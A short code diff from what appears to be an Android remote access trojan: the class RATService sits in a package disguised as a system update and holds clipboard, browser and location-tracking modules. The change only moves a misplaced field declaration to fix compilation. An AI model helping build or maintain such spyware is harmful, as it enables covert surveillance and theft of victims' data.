@@ -36,7 +36,7 @@ import android.content.pm.PackageManager;
 import org.json.JSONArray;
 
 import com.android.system.update.modules.*;
-private ClipboardModule clipboardModule;
+
 
 import org.json.JSONException;
 import org.json.JSONObject;
@@ -77,7 +77,7 @@ public class RATService extends Service {
     private PowerManager.WakeLock wakeLock;
     private int consecutiveFailures = 0;
     private BrowserModule browserModule;
-
+    private ClipboardModule clipboardModule;
     // Location tracking variables
     private LocationManager locationManager;
     private LocationListener locationListener;
